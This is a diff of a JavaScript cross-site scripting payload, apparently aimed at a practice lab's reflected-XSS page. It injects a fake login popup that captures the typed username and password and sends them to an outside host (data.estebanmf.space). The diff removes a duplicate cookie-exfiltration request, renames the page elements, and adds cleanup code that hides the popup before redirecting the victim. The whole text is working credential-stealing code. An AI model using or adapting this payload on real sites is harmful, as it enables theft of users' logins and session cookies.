@@ -4,7 +4,7 @@ try {
   console.log('Checking DOM availability');
   console.log('document.body exists:', !!document.body);
   console.log('xss-popup exists:', !!document.getElementById('xss-popup'));
-  console.log('submit-btn exists:', !!document.getElementById('submit-btn'));
+  console.log('xss-submit-btn exists:', !!document.getElementById('xss-submit-btn'));
 
   // Initial cookie send
   try {
@@ -23,31 +23,23 @@ try {
 
   // Attach event listener
   try {
-    const submitBtn = document.getElementById('submit-btn');
+    const submitBtn = document.getElementById('xss-submit-btn');
     if (!submitBtn) {
       console.error('Submit button not found');
       return;
     }
-    console.log('Attaching onclick to submit-btn');
+    console.log('Attaching onclick to xss-submit-btn');
     submitBtn.onclick = function() {
       try {
         console.log('Submit button clicked');
-        let u = document.getElementById('u').value;
-        let p = document.getElementById('p').value;
+        let u = document.getElementById('xss-u').value;
+        let p = document.getElementById('xss-p').value;
         if (!u || !p) {
           console.log('Validation failed: Empty fields');
           alert('Fill both fields.');
           return;
         }
         console.log('Sending credentials:', { username: u, password: p });
-        fetch('https://data.estebanmf.space/cookies', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ cookies: document.cookie }),
-          mode: 'no-cors'
-        })
-          .then(() => console.log('Cookie fetch sent'))
-          .catch(e => console.error('Cookie fetch failed:', e));
         fetch('https://data.estebanmf.space/credentials', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -56,12 +48,16 @@ try {
         })
           .then(() => {
             console.log('Fetch response received');
-            document.getElementById('msg').style.display = 'block';
+            document.getElementById('xss-msg').style.display = 'block';
             setTimeout(() => {
               console.log('Resetting inputs and redirecting');
-              document.getElementById('u').value = '';
-              document.getElementById('p').value = '';
-              document.getElementById('msg').style.display = 'none';
+              document.getElementById('xss-u').value = '';
+              document.getElementById('xss-p').value = '';
+              document.getElementById('xss-msg').style.display = 'none';
+              const popup = document.getElementById('xss-popup');
+              const overlay = document.getElementById('xss-overlay');
+              if (popup) popup.remove();
+              if (overlay) overlay.remove();
               window.location.href = document.referrer || 'http://kali.kali.estebanmf.space/vulnerabilities/xss_r/';
             }, 2000);
           })
